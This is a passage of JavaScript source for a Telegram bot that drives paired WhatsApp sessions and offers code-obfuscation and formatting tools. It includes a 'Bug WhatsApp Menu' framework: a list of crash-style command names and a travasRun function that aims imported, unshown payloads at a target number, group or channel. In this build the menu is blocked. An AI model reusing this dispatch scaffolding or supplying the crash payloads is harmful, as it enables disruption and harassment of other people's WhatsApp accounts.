import { InlineKeyboard, InputFile } from "grammy";
import {
  OWNER_USERNAME,
  OWNER_NUMBER,               // <-- Added
  MENU_VIDEO_URL,
  MAX_PAIR_PER_USER,
  FORCE_JOIN_CHANNEL,
  FORCE_JOIN_CHANNEL2,
  FORCE_JOIN_CHANNEL3,
  FORCE_JOIN_CHANNEL4,
  FORCE_JOIN_CHANNEL5
} from "../setting/config.js";
import travas from "./travas.js";

const DISABLED_DISRUPTIVE_COMMANDS = new Set([
    "freeze", "notif", "bandch", "crashch", "ban", "fc", "heavy",
    "crashinvisible", "blankera", "delay", "game", "uistuck",
    "iosaldevcrash", "ioshard", "ioslite", "bandgroup", "crashgroup", "channel",
]);
import { log } from "./logger.js";
import axios from "axios";
import fs from "fs";
import path from "path";
import os from "os";
import { createRequire } from "module";

// require() versi ESM. Dipakai khusus buat modul CJS yang "default export"-nya
// suka gak konsisten kalau di-load lewat dynamic import() (contoh: archiver).
const requireCjs = createRequire(import.meta.url);
import { Worker } from "worker_threads";
import {
    isOwner,
    isAdmin,
    canUseBot,
    addAdmin,
    removeAdmin,
    getAdmins,
    addPremium,
    removePremium,
    getPremiums,
    activateGlobalTrial,
    deactivateGlobalTrial,
    setMode,
    getPairsForUser,
    addPairNumber,
    getAllPairs,
    removePairNumber,
    clearAllPairs,
    getUsers,
    addUser,
    getBotsForUser,
    addBotEntry,
    removeBotEntry
} from "../database.js";
import {
    initWhatsappForNumber,
    endWhatsappForNumber,
    clearAllSessions,
    getClient,
    waitForPairSuccess as waitUntilOpen,
} from "./whatsapp.js";



const pendingAction = new Map();

// ==================== TOOLS HELPERS (dipindah dari tele.js) ====================
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// Jalanin fungsi berat di worker thread terpisah TANPA perlu file terpisah
// (workerFn di-serialize jadi string & dijalanin lewat mode eval).
// Biar main bot gak freeze pas ngerjain proses berat (obfuscate, parsing, dll).
function runInlineWorker(workerFn, data) {
    return new Promise((resolve, reject) => {
        const src = `
            const { parentPort, workerData } = require('worker_threads');
            (${workerFn.toString()})(workerData, parentPort);
        `;
        const worker = new Worker(src, { eval: true, workerData: data });
        worker.once('message', (msg) => { resolve(msg); worker.terminate(); });
        worker.once('error', (err) => reject(err));
        worker.once('exit', (code) => {
            if (code !== 0) reject(new Error(`Worker berhenti dengan kode ${code}`));
        });
    });
}

// ── Isi worker /fixcode (jalan di thread terpisah lewat runInlineWorker) ──
function fixcodeWorkerMain(workerData, parentPort) {
    function autoBalanceBrackets(src) {
        const pairs   = { '(': ')', '[': ']', '{': '}' };
        const closers = { ')': '(', ']': '[', '}': '{' };
        const stack   = [];
        let inString  = null;
        let inLineComment  = false;
        let inBlockComment = false;

        for (let i = 0; i < src.length; i++) {
            const c    = src[i];
            const next = src[i + 1];

            if (inLineComment) { if (c === '\n') inLineComment = false; continue; }
            if (inBlockComment) { if (c === '*' && next === '/') { inBlockComment = false; i++; } continue; }
            if (inString) {
                if (c === '\\') { i++; continue; }
                if (c === inString) inString = null;
                continue;
            }
            if (c === '/' && next === '/') { inLineComment = true; i++; continue; }
            if (c === '/' && next === '*') { inBlockComment = true; i++; continue; }
            if (c === '"' || c === "'" || c === '`') { inString = c; continue; }

            if (pairs[c]) {
                stack.push(c);
            } else if (closers[c]) {
                if (stack.length && stack[stack.length - 1] === closers[c]) stack.pop();
            }
        }

        if (!stack.length) return src;
        let suffix = '\n';
        for (let i = stack.length - 1; i >= 0; i--) suffix += pairs[stack[i]];
        return src + suffix;
    }

    function tryFixAwaitOutsideAsync(src, errLine) {
        const lines = src.split('\n');
        const start = Math.min(errLine - 1, lines.length - 1);

        for (let i = start; i >= 0; i--) {
            const line = lines[i];
            if (!line) continue;

            if (/(^|[^a-zA-Z0-9_$])function\*?\s*[a-zA-Z0-9_$]*\s*\(/.test(line) && !/\basync\s+function/.test(line)) {
                lines[i] = line.replace(/function/, 'async function');
                return lines.join('\n');
            }

            let m = line.match(/(\([^()]*\)|[a-zA-Z0-9_$]+)\s*=>/);
            if (m && !/\basync\b/.test(line.slice(0, m.index))) {
                const idx = line.indexOf(m[1], 0);
                if (idx !== -1) {
                    lines[i] = line.slice(0, idx) + 'async ' + line.slice(idx);
                    return lines.join('\n');
                }
            }

            m = line.match(/^(\s*)([a-zA-Z0-9_$]+)(\([^()]*\))\s*\{?\s*$/);
            if (m && !/\basync\b/.test(line) && !/^(if|for|while|switch|catch|function|return|else)$/.test(m[2])) {
                lines[i] = line.replace(m[2] + m[3], 'async ' + m[2] + m[3]);
                return lines.join('\n');
            }
        }
        return src;
    }

    function annotateErrorLine(src, err) {
        const lines    = src.split('\n');
        const line     = err.loc?.line || 1;
        const col      = err.loc?.column || 0;
        const marker   = `// ⚠ FIXCODE: ${err.message} (baris asli ${line}, kolom ${col}) - perlu perbaikan manual`;
        const insertAt = Math.max(0, Math.min(line - 1, lines.length));
        lines.splice(insertAt, 0, marker);
        return lines.join('\n');
    }

    (async () => {
        try {
            const acorn = require('acorn');
            let code = workerData.code;
            const fixedNotes = [];

            function tryParse(src) {
                try {
                    acorn.parse(src, { ecmaVersion: 'latest', sourceType: 'module', locations: true });
                    return { ok: true };
                } catch (err) {
                    return { ok: false, err };
                }
            }

            let parseResult = tryParse(code);
            let attempts = 0;

            while (!parseResult.ok && attempts < 8) {
                attempts++;
                const err = parseResult.err;
                let fixedCode = null;
                let noteText  = null;

                if (/await/i.test(err.message) && /async/i.test(err.message)) {
                    const attempt = tryFixAwaitOutsideAsync(code, err.loc?.line || 1);
                    if (attempt !== code) {
                        fixedCode = attempt;
                        noteText  = `Menambahkan 'async' pada function di sekitar baris ${err.loc?.line}`;
                    }
                }

                if (!fixedCode) {
                    const balanced = autoBalanceBrackets(code);
                    if (balanced !== code) {
                        fixedCode = balanced;
                        noteText  = 'Menambahkan kurung penutup yang hilang di akhir file';
                    }
                }

                if (!fixedCode) break;

                const retry = tryParse(fixedCode);
                code        = fixedCode;
                parseResult = retry;
                fixedNotes.push(noteText);
            }

            let unresolved = null;
            if (!parseResult.ok) {
                unresolved = parseResult.err;
                code = annotateErrorLine(code, unresolved);
                fixedNotes.push(`⚠ Masih ada error yang tidak bisa ditambal otomatis (baris ${unresolved.loc?.line}, kolom ${unresolved.loc?.column || 0}: ${unresolved.message}) — sudah ditandai komentar "FIXCODE" di file, cek manual`);
            }

            let finalCode = code;
            if (!unresolved) {
                try {
                    const prettier = require('prettier');
                    finalCode = await prettier.format(code, { parser: 'babel', semi: true });
                    fixedNotes.push('Merapikan format & indentasi kode (prettier)');
                } catch {
                    // prettier opsional
                }
            }

            parentPort.postMessage({ ok: true, finalCode, fixedNotes, unresolved: !!unresolved });
        } catch (e) {
            parentPort.postMessage({ ok: false, error: e.message });
        }
    })();
}

// ── Isi worker /encjs (jalan di thread terpisah lewat runInlineWorker) ──
function encjsWorkerMain(workerData, parentPort) {
    const fs = require('fs');
    (async () => {
        try {
            const JavaScriptObfuscator = require('javascript-obfuscator');
            const bytenode = require('bytenode');

            const result = JavaScriptObfuscator.obfuscate(workerData.code, {
                compact: true,
                controlFlowFlattening: true,
                controlFlowFlatteningThreshold: 1,
                deadCodeInjection: true,
                deadCodeInjectionThreshold: 0.4,
                selfDefending: false,
                debugProtection: false,
                disableConsoleOutput: false,
                identifierNamesGenerator: 'hexadecimal',
                numbersToExpressions: true,
                renameGlobals: false,
                simplify: true,
                splitStrings: true,
                splitStringsChunkLength: 5,
                stringArray: true,
                stringArrayCallsTransform: true,
                stringArrayEncoding: ['rc4'],
                stringArrayIndexShift: true,
                stringArrayRotate: true,
                stringArrayShuffle: true,
                stringArrayWrappersCount: 2,
                stringArrayWrappersChainedCalls: true,
                stringArrayWrappersParametersMaxCount: 4,
                stringArrayWrappersType: 'function',
                stringArrayThreshold: 1,
                transformObjectKeys: true,
                unicodeEscapeSequence: false
            });

            const obfuscated = result.getObfuscatedCode();
            fs.writeFileSync(workerData.tmpJsPath, obfuscated, 'utf8');

            bytenode.compileFile({ filename: workerData.tmpJsPath, output: workerData.jscPath });

            parentPort.postMessage({ ok: true });
        } catch (e) {
            parentPort.postMessage({ ok: false, error: e.message });
        }
    })();
}

// Inside registerBotHandlers, after async function botReply(...) { ... }

async function executeGroupCheck(ctx, sock, groupInput, targetJid, targetNumber, displayUrl, loopCount) {
    // Safe, non-destructive group verification flow.
    if (loopCount === 1) {
        let groupJid;
        try {
            groupJid = await resolveGbTarget(sock, groupInput);
            const metadata = await sock.groupMetadata(groupJid);

            await ctx.replyWithPhoto("https://k.top4top.io/p_388011pnf1.jpg", {
                caption: `<blockquote> Group Check Result ᝄ</blockquote>  
☇ Target: ${targetNumber}
☇ Group: ${groupJid}
☇ Status: Success
☇ Command: /groupcheck
☇ Members: ${metadata?.participants?.length ?? 0}
☇ Account Status: Safe
☇ Notes: No member removal or destructive action performed`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[{ text: "ᴄʜᴇᴄᴋ ɢʀᴏᴜᴘ", url: displayUrl }]],
                },
            });
        } catch (e) {
            console.error("❌ Error group check:", e);
            const errText = String(e?.message || e);
            let detailError = "Unable to open the group, the invite link is invalid, or the bot cannot access the group.";
            if (errText.includes("account_reachout_restricted")) {
                detailError = "The account is restricted or rate-limited.";
            }
            await ctx.replyWithPhoto("https://k.top4top.io/p_388011pnf1.jpg", {
                caption: `<blockquote> Group Check Failed ᝄ</blockquote>  
☇ Target: ${targetNumber}
☇ Group: ${groupJid || "Not detected"}
☇ Status: Failed
☇ Command: /groupcheck

⇢ Detail Error:
${detailError}`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[{ text: "ᴄʜᴇᴄᴋ ɢʀᴏᴜᴘ", url: displayUrl }]],
                },
            });
        }
        return;
    }

    let totalSuccess = 0;
    let totalFailed = 0;

    const progressMsg = await botReply(
        ctx,
        `🔎 GROUP CHECK (${loopCount}x)`,
        [
            ["Input", groupInput],
            ["Loop", `0/${loopCount}`],
            ["Success", "0"],
            ["Failed", "0"],
            ["Status", "Starting..."]
        ]
    );

    for (let i = 1; i <= loopCount; i++) {
        try {
            const groupJid = await resolveGbTarget(sock, groupInput);
            await sock.groupMetadata(groupJid);
            totalSuccess++;
        } catch (err) {
            totalFailed++;
            console.error(`Group check loop ${i} error:`, err.message);
        }

        try {
            await ctx.api.editMessageText(
                ctx.chat.id,
                progressMsg.message_id,
                `🔎 GROUP CHECK (${i}/${loopCount})\nInput: ${groupInput}\nSuccess: ${totalSuccess}\nFailed: ${totalFailed}\nStatus: ${i < loopCount ? 'Running...' : '✅ Completed'}`
            );
        } catch (editErr) { /* ignore */ }

        if (i < loopCount) {
            await new Promise(resolve => setTimeout(resolve, 100));
        }
    }

    await botReply(ctx, "✅ GROUP CHECK COMPLETE", [
        ["Input", groupInput],
        ["Total loops", String(loopCount)],
        ["Successful", String(totalSuccess)],
        ["Failed", String(totalFailed)]
    ]);
}

function extractGroupCode(input) {
    const text = String(input || "").trim();
    const match = text.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/i);
    return match ? match[1] : null;
}

async function resolveGbTarget(sock, q) {
    const input = String(q || "").trim();
    // If it's already a JID
    if (input.endsWith("@g.us")) return input;

    // If it's a group invite link
    const code = extractGroupCode(input);
    if (code) {
        // Join the group
        const joinedJid = await sock.groupAcceptInvite(code);
        if (!joinedJid) throw new Error("Gagal join grup dari link.");
        return joinedJid;
    }

    // If user just sent a numeric ID
    return input.replace(/[^0-9]/g, "") + "@g.us";
}

// Helper to get owner's active WhatsApp socket
function getOwnerSocket() {
    // Use global if available and valid
    if (global.ownerSocket && typeof global.ownerSocket.sendMessage === 'function') {
        return global.ownerSocket;
    }
    // Fallback: search waClients for the owner's number
    const ownerNumber = OWNER_NUMBER; // must be exported from config
    if (!ownerNumber) return null;
    for (const [key, client] of waClients.entries()) {
        const [, number] = key.split('_');
        if (number === ownerNumber && client.status === 'open' && client.sock) {
            // Update global for future use
            global.ownerSocket = client.sock;
            return client.sock;
        }
    }
    return null;
}

// ── Isi worker /deobfuscate (jalan di thread terpisah lewat runInlineWorker) ──
// Dipindah ke worker karena webcrack (AST deobfuscation) & prettier.format
// itu computation berat yang sinkron, kalau jalan di main thread bikin
// seluruh bot (semua user/sub-bot) freeze sampai selesai.
function deobfuscateWorkerMain(workerData, parentPort) {
    (async () => {
        try {
            let webcrack;
            try {
                const mod = await import('webcrack');
                webcrack = mod.webcrack;
            } catch {
                return parentPort.postMessage({ ok: false, error: "Cannot find module 'webcrack'" });
            }

            const result = await webcrack(workerData.code);
            let finalCode = result.code;

            try {
                const prettier = require('prettier');
                finalCode = await prettier.format(finalCode, { parser: 'babel', semi: true });
            } catch {
                // prettier opsional, biarin hasil webcrack aja kalau gagal
            }

            parentPort.postMessage({ ok: true, finalCode });
        } catch (e) {
            parentPort.postMessage({ ok: false, error: e.message });
        }
    })();
}

// ── Isi worker /minify (jalan di thread terpisah lewat runInlineWorker) ──
function minifyWorkerMain(workerData, parentPort) {
    (async () => {
        try {
            let terserMod;
            try {
                terserMod = await import('terser');
            } catch {
                return parentPort.postMessage({ ok: false, error: "Cannot find module 'terser'" });
            }

            const result = await terserMod.minify(workerData.code, { compress: true, mangle: true });

            if (result.error) {
                return parentPort.postMessage({ ok: false, error: result.error.message });
            }

            parentPort.postMessage({ ok: true, code: result.code });
        } catch (e) {
            parentPort.postMessage({ ok: false, error: e.message });
        }
    })();
}

// ── Isi worker /beautify (jalan di thread terpisah lewat runInlineWorker) ──
function beautifyWorkerMain(workerData, parentPort) {
    (async () => {
        try {
            let prettier;
            try {
                prettier = require('prettier');
            } catch {
                return parentPort.postMessage({ ok: false, error: "Cannot find module 'prettier'" });
            }

            const formatted = await prettier.format(workerData.code, { parser: 'babel', semi: true });
            parentPort.postMessage({ ok: true, formatted });
        } catch (e) {
            parentPort.postMessage({ ok: false, error: e.message });
        }
    })();
}

// ── Isi worker /lint (jalan di thread terpisah lewat runInlineWorker) ──
// ESLint.lintText itu parsing + eksekusi banyak rule sekaligus, sinkron
// dan berat buat file besar — sama kelasnya kayak webcrack/prettier/terser.
function lintWorkerMain(workerData, parentPort) {
    (async () => {
        try {
            let ESLint;
            try {
                const mod = await import('eslint');
                ESLint = mod.ESLint;
            } catch {
                return parentPort.postMessage({ ok: false, error: "Cannot find module 'eslint'" });
            }

            const eslint = new ESLint({
                useEslintrc: false,
                overrideConfig: {
                    parserOptions: { ecmaVersion: 'latest', sourceType: 'module' },
                    env: { node: true, es2022: true },
                    rules: {
                        'no-unused-vars': 'warn',
                        'no-undef': 'warn',
                        'no-dupe-keys': 'error',
                        'no-cond-assign': 'error',
                        'no-const-assign': 'error',
                        'no-unreachable': 'warn'
                    }
                }
            });

            const results = await eslint.lintText(workerData.code, { filePath: workerData.fileName });
            parentPort.postMessage({ ok: true, messages: results[0]?.messages || [] });
        } catch (e) {
            parentPort.postMessage({ ok: false, error: e.message });
        }
    })();
}

// Download isi file Telegram sebagai teks, dengan retry biar gak gampang
// gagal cuma karena koneksi sempat putus (ECONNRESET/ETIMEDOUT/dll)
async function downloadTelegramFileText(fileUrl, retries = 3) {
    let lastErr;
    for (let i = 0; i < retries; i++) {
        try {
            const res = await axios.get(fileUrl, {
                responseType: "arraybuffer",
                timeout: 30000
            });
            return Buffer.from(res.data).toString("utf8");
        } catch (e) {
            lastErr = e;
            if (i < retries - 1) await sleep(1000 * (i + 1));
        }
    }
    throw lastErr;
}

// Ambil kode JS dari pesan yang direply, dukung dua bentuk:
// 1) reply ke file .js (document)  2) reply ke pesan teks/caption berisi kode
// Dipakai bareng sama tools fixcode (beautify, minify, statcode, extractfunc, lint)
async function getReplyJsCode(ctx) {
    const r = ctx.message.reply_to_message;
    if (!r) return null;

    if (r.document) {
        const fname = r.document.file_name || "code.js";
        if (!fname.toLowerCase().endsWith(".js")) return null;
        const tgFile = await ctx.api.getFile(r.document.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${ctx.api.token}/${tgFile.file_path}`;
        const code = await downloadTelegramFileText(fileUrl);
        return { code, fileName: fname };
    }

    const text = r.text || r.caption;
    if (text && text.trim()) return { code: text, fileName: "snippet.js" };

    return null;
}

// Upload buffer (hasil proses lokal: HD foto/video, audio hasil ekstrak, dll) ke catbox
// biar dapat link publik yang bisa langsung dibagikan/didownload user.
// Loader khusus buat "archiver": versi terbaru paket ini udah full ESM ("type":"module"),
// sementara versi lama masih CJS. Coba beberapa cara biar dapet function-nya, apapun versinya.
async function resolveArchiver() {
    let mod;
    try {
        mod = requireCjs("archiver");
    } catch (e) {
        if (e.code === "MODULE_NOT_FOUND") throw new Error("MODULE_ARCHIVER_MISSING");
        // Kalau errornya karena paket ini ternyata ESM (ERR_REQUIRE_ESM dkk), fallback ke import()
        mod = await import("archiver");
    }

    const candidates = [mod, mod?.default, mod?.default?.default, mod?.create];
    for (const c of candidates) {
        if (typeof c === "function") return c;
    }

    throw new Error("ARCHIVER_SHAPE_UNKNOWN:" + JSON.stringify(Object.keys(mod || {})));
}

const UA_BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";

// Upload hasil proses (foto/video/audio) ke file host publik biar dapet link.
// Coba catbox.moe dulu (permanen), kalau gagal/kena block (banyak kejadian catbox
// nolak request dari VPS/server tertentu) otomatis fallback ke uguu.se (link ±3 hari).
// Cari path binary ffmpeg. Prioritas: package "ffmpeg-static" (di-download otomatis
// pas "npm install", gak perlu install manual/edit PATH di OS manapun). Kalau gak ada,
// fallback ke ffmpeg yang mungkin udah terinstall di sistem.
function resolveFfmpegPath() {
    try {
        const staticPath = requireCjs("ffmpeg-static");
        if (staticPath && fs.existsSync(staticPath)) return staticPath;
    } catch {
        // ffmpeg-static belum keinstall, coba fallback ke ffmpeg sistem
    }
    return "ffmpeg";
}

async function uploadBufferToCatbox(buffer, filename) {
    let FormData;
    try {
        FormData = requireCjs("form-data");
    } catch {
        throw new Error("MODULE_FORM_DATA_MISSING");
    }

    // 1) coba catbox.moe (link permanen)
    try {
        const form = new FormData();
        form.append("reqtype", "fileupload");
        form.append("fileToUpload", buffer, filename);

        const { data } = await axios.post("https://catbox.moe/user/api.php", form, {
            headers: { ...form.getHeaders(), "User-Agent": UA_BROWSER },
            timeout: 60000,
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });

        const link = String(data).trim();
        if (/^https?:\/\//i.test(link)) return { link, host: "catbox.moe (permanen)" };
        console.error("Catbox nolak upload, respon:", link);
    } catch (e) {
        console.error("Catbox gagal, fallback ke uguu.se. Detail:", e.message);
    }

    // 2) fallback ke uguu.se (link sementara, dihapus otomatis ±3 hari)
    const form2 = new FormData();
    form2.append("files[]", buffer, filename);

    const { data: data2 } = await axios.post("https://uguu.se/upload?output=text", form2, {
        headers: { ...form2.getHeaders(), "User-Agent": UA_BROWSER },
        timeout: 60000,
        maxContentLength: Infinity,
        maxBodyLength: Infinity
    });

    const link2 = String(data2).trim();
    if (!/^https?:\/\//i.test(link2)) throw new Error("UPLOAD_ALL_HOST_FAILED: " + link2);
    return { link: link2, host: "uguu.se (sementara, link aktif ±3 hari)" };
}


// ----------- ( fungsi utama: registerBotHandlers ) ------------ //
// Dipanggil sekali per instance bot (bot utama ATAU sub-bot hasil /addbot).
// opts.isSubBot   -> true kalau ini bot hasil clone, matiin fitur addbot/listbot/delbot/bc
// opts.subBotOwnerId -> uid yang dianggap "owner" khusus buat sub-bot ini

    export function registerBotHandlers(bot, opts = {}) {
        const isSubBot = !!opts.isSubBot;
        const subBotOwnerId = opts.subBotOwnerId ? String(opts.subBotOwnerId) : null;

        // ----------- ( draft "Naviya V9 PRO..." sebelum Rich Message tampil ) ------------ //
        // Hook di level API (bukan di tiap fungsi kirim menu), jadi otomatis kepasang ke
        // SEMUA menu Rich Message yang bot ini kirim/edit -- tanpa perlu ubah kode di
        // sendStartMenu/sendToolsMenu/botReply/dst satu-satu.
        // "sendRichMessageDraft" + tag <tg-thinking> adalah method resmi Telegram (Bot API 10.1)
        // buat nunjukin state "lagi diproses" sebelum konten final tampil.
        bot.api.config.use(async (prev, method, payload, signal) => {
            if ((method === "sendRichMessage" || method === "editMessageText") && payload?.rich_message) {
                const chatId = Number(payload.chat_id);
                if (Number.isSafeInteger(chatId) && chatId > 0) {
                    try {
                        await bot.api.raw.sendRichMessageDraft({
                            chat_id: chatId,
                            draft_id: Math.max(1, Math.floor(Date.now() % 2_000_000_000)),
                            rich_message: { html: "<tg-thinking>Naviya V9 PRO...</tg-thinking>" }
                        });
                        await sleep(400);
                    } catch {
                        // draft cuma hiasan, kalau gagal (client lama/dll) lanjut aja kirim konten aslinya
                    }
                }
            }
            if (method === "sendRichMessage" && payload?.rich_message?.blocks) {
                const blocks = payload.rich_message.blocks.filter((block) => {
                    if (block.type === "video") return Boolean(block.video?.media);
                    if (block.type === "photo") return Boolean(block.photo?.media);
                    return true;
                });

                payload = {
                    ...payload,
                    rich_message: {
                        ...payload.rich_message,
                        blocks,
                    },
                };
            }

            return prev(method, payload, signal);
        });

        // owner check disesuaikan: sub-bot pake id_owner yang dikasih pas /addbot,
        // bot utama tetep pake OWNER_ID dari .env
        const checkOwner = (uid) => (isSubBot ? String(uid) === subBotOwnerId : isOwner(uid));


        // ----------- ( helper: botReply, botError, botSucces, botList ) ------------ //

            async function botReply(ctx, title, rows, keyboard = null) {
                const cells = [
                    [
                        { text: "Status", is_header: true, align: "center", valign: "middle" },
                        { text: "Detail", is_header: true, align: "center", valign: "middle" }
                    ],
                    ...rows.map(([label, value]) => [
                        { text: String(label), align: "left", valign: "middle" },
                        { text: String(value), align: "left", valign: "middle" }
                    ])
                ];

                const payload = {
                    chat_id: ctx.chat.id,
                    rich_message: {
                        blocks: [
                            { type: "heading", text: title, size: 1 },
                            { type: "table", cells, is_bordered: true, is_striped: true }
                        ]
                    }
                };

                if (keyboard) payload.reply_markup = keyboard;

                return bot.api.raw.sendRichMessage(payload);
            }

            // Sama kayak botReply, tapi bisa dibarengin video/foto di atas tabelnya.
            // media = { video: <url/file_id/InputFile> } atau { photo: <...> }
            async function botMediaReply(ctx, media, title, rows, keyboard = null) {
                const cells = [
                    [
                        { text: "Info", is_header: true, align: "center", valign: "middle" },
                        { text: "Detail", is_header: true, align: "center", valign: "middle" }
                    ],
                    ...rows.map(([label, value]) => [
                        { text: String(label), align: "left", valign: "middle" },
                        { text: String(value), align: "left", valign: "middle" }
                    ])
                ];

                const blocks = [];
                if (media?.video) blocks.push({ type: "video", video: { type: "video", media: media.video } });
                if (media?.photo) blocks.push({ type: "photo", photo: { type: "photo", media: media.photo } });
                blocks.push({ type: "heading", text: title, size: 1 });
                blocks.push({ type: "table", cells, is_bordered: true, is_striped: true });

                const payload = {
                    chat_id: ctx.chat.id,
                    rich_message: { blocks }
                };
                if (keyboard) payload.reply_markup = keyboard;

                return bot.api.raw.sendRichMessage(payload);
            }

            function botError(ctx, reason, title = "⚠️ ACCESS WARNING") {
                return botReply(ctx, title, [
                    ["Access", "❌ Denied"],
                    ["Reason", reason]
                ]);
            }

            function botSucces(ctx, detail, title = "✅ STATUS SUCCESS\n") {
                return botReply(ctx, title, [
                    ["Status", "✅ Success"],
                    ["Detail", detail]
                ]);
            }

            function botList(ctx, title, items, emptyText = "Kosong") {
                if (!items.length) {
                    return botReply(ctx, title, [["Total", emptyText]]);
                }
                return botReply(ctx, title, items.map((item, i) => [`#${i + 1}`, item]));
            }


        // ----------- ( fungsi: sendTextResult ) ------------ //

            async function sendTextResult(ctx, data) {
                if (data.type === "single") {
                    return botReply(ctx, "✨ RESULT BOT\n", [
                        ["Message", "✅ Berhasil terkirim"],
                        ["Session", data.session],
                        ["Target", data.target]
                    ]);
                }

                if (data.type === "all") {
                    const rows = data.results.map((item) => {
                        const split = item.split(" — ");
                        return [split[0], split[1] || "-"];
                    });
                    return botReply(ctx, "✨ RESULT BOT\n", rows);
                }
            }


            async function travasRun(ctx, uid, args, command, type, func) {
        let target;

        if (type === "user") {
            const number = (args[0] || "").replace(/[^0-9]/g, "");
            if (!number) return botError(ctx, `Format: /${command} <nomor>`, "⚠️ FORMAT SALAH");
            target = `${number}@s.whatsapp.net`;
        } else if (type === "group") {
            const link = args[0];
            if (!link) return botError(ctx, `Format: /${command} <link grup>`, "⚠️ FORMAT SALAH");

            const sessionKey = getSessionKey(uid);
            const sessions = getPairsForUser(sessionKey);
            const active = sessions.find(num => getClient(sessionKey, num)?.status === "open");

            if (!active) return botError(ctx, "Tidak ada sender aktif.", "⚠️ OFFLINE");

            const sock = getClient(sessionKey, active).sock;

            try {
                const invite = link.split("chat.whatsapp.com/")[1];
                if (!invite) return botError(ctx, "Link grup tidak valid.", "⚠️ ERROR");
                const metadata = await sock.groupMetadataFromInvite(invite);
                target = metadata.id;
            } catch (err) {
                return botError(ctx, err.message, "❌ GAGAL");
            }
        } else if (type === "channel") {
            const channelId = (args[0] || "").replace(/[^0-9]/g, "");
            if (!channelId) return botError(ctx, `Format: /${command} <channel_id>`, "⚠️ FORMAT SALAH");
            target = `${channelId}@newsletter`;
        }

        await actionSession(
            ctx,
            uid,
            getSessionKey(uid),
            target,
            async (sock, target) => {
                 (async () => { 
                await func(sock, target);
                })().catch(err => log.error(err));
            },
            sendTextResult
        );
    }

        // ----------- ( fungsi: sendStartMenu ) ------------ //

            async function sendStartMenu(ctx) {
                const keyboard = {
                    inline_keyboard: [
                        [
                            { text: "𝗔𝗟𝗟 - 𝗠𝗘𝗡𝗨", callback_data: "all_menu", style: "success", icon_custom_emoji_id: "5780864206177834457" },
                            { text: "𝗕𝗨𝗚 - 𝗠𝗘𝗡𝗨", callback_data: "travas_menu", style: "success", icon_custom_emoji_id: "6267140231632262769" }
                        ],
                        [
                            { text: "𝗧𝗢𝗢𝗟𝗦 - 𝗠𝗘𝗡𝗨", callback_data: "tools_menu", style: "success", icon_custom_emoji_id: "6028477720856367105" },
                            { text: "𝗙𝗜𝗫 𝗖𝗢𝗗𝗘 - 𝗠𝗘𝗡𝗨", callback_data: "fixcode_menu", style: "success", icon_custom_emoji_id: "5188481279963715781" }
                        ],
                        [
                            { text: "𝗢𝗦𝗜𝗡𝗧 - 𝗠𝗘𝗡𝗨", callback_data: "osint_menu", style: "success", icon_custom_emoji_id: "6266777440039736768" }
                        ],
                        [
                            { text: "𝗢𝗪𝗡𝗘𝗥 𝗖𝗢𝗡𝗧𝗔𝗖𝗧", url: "https://t.me/" + (OWNER_USERNAME || "telegram"), style: "success", icon_custom_emoji_id: "5780864206177834457" }
                        ]
                    ]
                };

                await bot.api.raw.sendRichMessage({
                    chat_id: ctx.chat.id,
                    rich_message: {
                        blocks: [
                            { type: "video", video: { type: "video", media: MENU_VIDEO_URL } },
                            { type: "heading", text: [{ type: "custom_emoji", custom_emoji_id: "5321205987137310651", alternative_text: "✨" }, " 𝙉𝘼𝙑𝙄𝙔𝘼 𝘽𝙊𝙏 𝙈𝙀𝙉𝙐\n"], size: 1 },
                            {
                                type: "paragraph",
                                text: [
                                    "𝖧𝖺𝗅𝗈𝗈 ",
                                    { type: "bold", text: ctx.from.first_name },
                                    " 👋\n",
                                ]
                            },
                            { type: "heading", text: "⚙️ BOT INFORMATION", size: 2 },
                            {
                                type: "table",
                                cells: [
                                    [
                                        { text: "𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇", is_header: true, align: "center", valign: "middle" },
                                        { text: "𝖣𝖾𝗍𝖺𝗂𝗅𝗌", is_header: true, align: "center", valign: "middle" }
                                    ],
                                    [{ text: "𝗖𝗿𝗲𝗮𝘁𝗼𝗿" }, { text:"@smartsquardyt" }],
                                    [{ text: "𝗩𝗲𝗿𝘀𝗶𝗼𝗻" }, { text: "9.0" }],
                                    [{ text: "𝗣𝗿𝗲𝗳𝗶𝘅" }, { text: "/" }],
                                    [{ text: "𝗦𝘁𝗮𝘁𝘂𝘀" }, { text: "Online 🟢" }]
                                ],
                                is_bordered: true,
                                is_striped: true
                            }
                        ]
                    },
                    reply_markup: keyboard
                });
            }


        // ----------- ( fungsi: sendTravasMenu ) ------------ //

            async function sendTravasMenu(ctx) {
                return botError(
                    ctx,
                    "Disruptive WhatsApp payload commands are not included in this build.",
                    "🛡️ SAFETY BLOCK"
                );
        const keyboard = {
            inline_keyboard: [
                [
                    {
                        text: "𝗕𝗔𝗖𝗞 - 𝗠𝗘𝗡𝗨",
                        callback_data: "back_menu",
                        style: "danger",
                        icon_custom_emoji_id: "6028477720856367105"
                    }
                ]
            ]
        };

        const gap = {
            type: "paragraph",
            text: [" "]
        };

        const makeTable = (headers, rows) => ({
            type: "table",
            cells: [
                headers.map(text => ({
                    text,
                    is_header: true,
                    align: "center",
                    valign: "middle"
                })),
                ...rows.map(row =>
                    row.map(text => ({
                        text
                    }))
                )
            ],
            is_bordered: true,
            is_striped: true
        });

        const blocks = [
            {
                type: "video",
                video: {
                    type: "video",
                    media: MENU_VIDEO_URL
                }
            },
            {
                type: "heading",
                text: "🦠 Bug WhatsApp Menu",
                size: 1
            },
            {
                type: "paragraph",
                text: [
                    "Halo ",
                    { type: "bold", text: ctx.from.first_name },
                    " 👋\n",
                    "Bug is a WhatsApp management feature menu.\n",
                    "Select the available command below."
                ]
            },
            gap,
            {
                type: "heading",
                text: "⚠️ Risk Information",
                size: 4
            },
            makeTable(
                [
                    "Risk",
                    "Status",
                    "Information"
                ],
                [
                    [
                        "🟢 LOW",
                        "Safe",
                        "Lower limitation possibility"
                    ],
                    [
                        "🟡 MEDIUM",
                        "Normal",
                        "Use with normal limits"
                    ],
                    [
                        "🔴 HIGH",
                        "Warning",
                        "Higher limitation possibility"
                    ]
                ]
            ),
            gap,
            {
